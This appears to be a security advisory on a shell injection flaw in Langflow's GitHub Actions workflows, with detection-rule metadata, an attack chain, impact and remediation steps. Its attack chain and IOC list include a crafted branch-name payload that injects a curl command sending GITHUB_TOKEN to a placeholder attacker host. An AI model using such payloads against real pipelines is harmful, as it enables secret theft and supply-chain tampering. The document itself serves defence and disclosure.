---
title: Langflow GitHub Actions Shell Injection Vulnerability
slug: 2026-03-langflow-shell-injection
description: Unauthenticated remote shell injection vulnerability exists in Langflow GitHub Actions workflows prior to version 1.9.0, enabling attackers to execute arbitrary shell commands via malicious branch names or pull request titles due to unsanitized GitHub context variable interpolation, leading to potential secret exfiltration and supply chain compromise.
date: "2026-03-25T12:00:00Z"
type: coverage
types:
  - coverage
severities:
  - critical
tags:
  - shell-injection
  - github-actions
  - supply-chain
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1588
    technique_name: Obtain Capabilities
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-33475
iocs:
  - type: url
    value: https://attacker.site/exfil?token=$GITHUB_TOKEN
ioc_counts:
  url: 1
rules:
  - title: Detect Github Actions Shell Injection via Branch Name
    description: Detects potentially malicious branch names used in GitHub Actions pull requests that could lead to shell injection.
    platform: sigma
    severity: high
    tactics:
      - execution
      - initial_access
    techniques:
      - T1059.004
      - T1588.006
    data_sources:
      - github
      - github_actions
  - title: Detect Github Actions Shell Injection via PR Title
    description: Detects potentially malicious PR Titles used in GitHub Actions that could lead to shell injection.
    platform: sigma
    severity: high
    tactics:
      - execution
      - initial_access
    techniques:
      - T1059.004
      - T1588.006
    data_sources:
      - github
      - github_actions
rules_count: 2
---

Langflow, a tool for building and deploying AI-powered agents and workflows, is vulnerable to a critical shell injection flaw in its GitHub Actions workflows. Discovered in versions prior to 1.9.0 and assigned CVE-2026-33475, the vulnerability stems from unsanitized interpolation of GitHub context variables (e.g., `${{ github.head_ref }}`) within the `run:` steps of various workflow files. By crafting malicious branch names or pull request titles, attackers can inject and execute arbitrary shell commands during CI/CD pipeline execution. Successful exploitation allows for the exfiltration of sensitive CI/CD secrets like `GITHUB_TOKEN`, manipulation of infrastructure, and potential compromise of the software supply chain. The vulnerability was patched in version 1.9.0. This poses a significant risk to any public Langflow fork with GitHub Actions enabled.

## Attack Chain

1. The attacker forks the Langflow repository on GitHub.
2. The attacker creates a new branch with a specially crafted name containing a shell injection payload, such as `injection-test && curl https://attacker.site/exfil?token=$GITHUB_TOKEN`.
3. The attacker submits a pull request from the malicious branch to the main branch of the forked repository.
4. GitHub Actions is triggered to run the affected workflow (e.g., `deploy-docs-draft.yml`).
5. Within the workflow, the `run:` step attempts to use the unsanitized branch name via `${{ github.head_ref }}`.
6. The injected shell command executes, sending the `GITHUB_TOKEN` to an attacker-controlled server.
7. The attacker receives the `GITHUB_TOKEN` and can now authenticate to the GitHub API with the privileges of the affected workflow.
8. The attacker leverages the compromised `GITHUB_TOKEN` to push malicious code, create new releases, or tamper with other aspects of the software supply chain.

## Impact

This vulnerability allows for arbitrary code execution within the GitHub Actions CI/CD environment. A successful attack grants full access to CI secrets, potentially leading to the exfiltration of the `GITHUB_TOKEN`. The attacker can then push malicious tags or container images, tamper with releases, or leak sensitive infrastructure data.  Given the nature of CI/CD pipelines, a compromise could have far-reaching effects on any project that depends on the affected Langflow repository or its forks. The number of potential victims is directly proportional to the number of Langflow forks with enabled GitHub Actions.

## Recommendation

*   Upgrade to Langflow version 1.9.0 or later to patch CVE-2026-33475.
*   Examine GitHub Actions workflows for direct interpolation of GitHub context variables in `run:` steps, particularly those involving user-controlled values like branch names and pull request titles (e.g., in `.github/workflows/deploy-docs-draft.yml`).
*   Implement proper sanitization or quoting of untrusted inputs before using them in shell commands within GitHub Actions workflows.
*   Adopt the suggested fix of using environment variables and wrapping them in double quotes when referencing GitHub context variables within `run:` steps (as described in the overview).
*   Deploy the Sigma rule `Detect Github Actions Shell Injection via Branch Name` to identify potentially malicious branch names used in pull requests.
